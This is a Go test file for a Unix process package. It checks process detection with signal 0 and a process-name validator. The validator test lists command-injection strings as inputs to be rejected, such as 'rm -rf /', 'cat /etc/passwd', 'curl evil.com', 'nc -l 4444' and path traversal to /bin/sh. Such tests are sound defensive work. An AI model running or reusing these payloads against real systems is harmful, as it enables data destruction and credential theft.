//go:build !windows

package process

import (
	"syscall"
	"testing"
)

func TestProcessExistsEdgeCases(t *testing.T) {

	// Test signal 0 check for non-existent PID
	nonExistentPID := findNonExistentPID()
	if processExists(nonExistentPID) {
		t.Fatalf("processExists returned true for non-existent PID %d", nonExistentPID)
	}

	// Test signal 0 check for current PID
	currentPID := syscall.Getpid()
	if !processExists(currentPID) {
		t.Fatalf("processExists returned false for current PID %d", currentPID)
	}

	// Test invalid PID handling
	if processExists(0) {
		t.Fatalf("processExists returned true for PID 0")
	}

	if processExists(-1) {
		t.Fatalf("processExists returned true for negative PID")
	}
}

func findNonExistentPID() int {
	// Start from a high PID and work down to find one that doesn't exist
	for pid := 99999; pid > 50000; pid-- {
		if err := syscall.Kill(pid, 0); err != nil {
			// Error means process doesn't exist
			return pid
		}
	}
	// Fallback (unlikely to reach here)
	return 99999
}

func TestProcessExistsImplementation(t *testing.T) {

	// Test the actual syscall.Kill(pid, 0) implementation
	currentPID := syscall.Getpid()

	// This should succeed (process exists)
	err := syscall.Kill(currentPID, 0)
	if err != nil {
		t.Fatalf("syscall.Kill(currentPID, 0) failed: %v", err)
	}

	// This should fail (process doesn't exist)
	nonExistentPID := findNonExistentPID()
	err = syscall.Kill(nonExistentPID, 0)
	if err == nil {
		t.Fatalf("syscall.Kill(nonExistentPID, 0) should have failed")
	}
}

// TestIsValidProcessNameRejectsInjection verifies that command injection attempts
// are properly rejected by the process name validation function.
func TestIsValidProcessNameRejectsInjection(t *testing.T) {

	// Test cases for various command injection attempts
	injectionAttempts := []struct {
		name     string
		expected bool
	}{
		// Valid names
		{"valid-process", true},
		{"valid_process", true},
		{"valid.process", true},
		{"valid123", true},
		{"", false}, // Empty name
		
		// Command injection attempts (should be rejected)
		{"process; rm -rf /", false},
		{"process && cat /etc/passwd", false},
		{"process || curl evil.com", false},
		{"process`whoami`", false},
		{"process$(id)", false},
		{"process|nc -l 4444", false},
		{"process> /etc/shadow", false},
		{"process< /dev/zero", false},
		
		// Shell metacharacters (should be rejected)
		{"process;", false},
		{"process&", false},
		{"process|", false},
		{"process>", false},
		{"process<", false},
		{"process`", false},
		{"process$", false},
		{"process!", false},
		{"process*", false},
		{"process?", false},
		{"process[", false},
		{"process]", false},
		{"process{", false},
		{"process}", false},
		{"process(", false},
		{"process)", false},
		{"process ", false}, // Space
		{" process", false}, // Leading space
		{"process ", false}, // Trailing space
		{"process\t", false}, // Tab
		{"process\n", false}, // Newline
		{"process\r", false}, // Carriage return
		
		// Path traversal attempts (should be rejected due to slash)
		{"../../../bin/sh", false},
		{"/bin/sh", false},
		{"..\\..\\..\\windows\\system32\\cmd.exe", false},
		
		// Quotes and escapes
		{"\"process\"", false},
		{"'process'", false},
		{"\\process", false},
	}

	for _, tc := range injectionAttempts {
		t.Run(tc.name, func(t *testing.T) {
			result := isValidProcessName(tc.name)
			if result != tc.expected {
				t.Errorf("isValidProcessName(%q) = %v, expected %v", tc.name, result, tc.expected)
			}
		})
	}
}
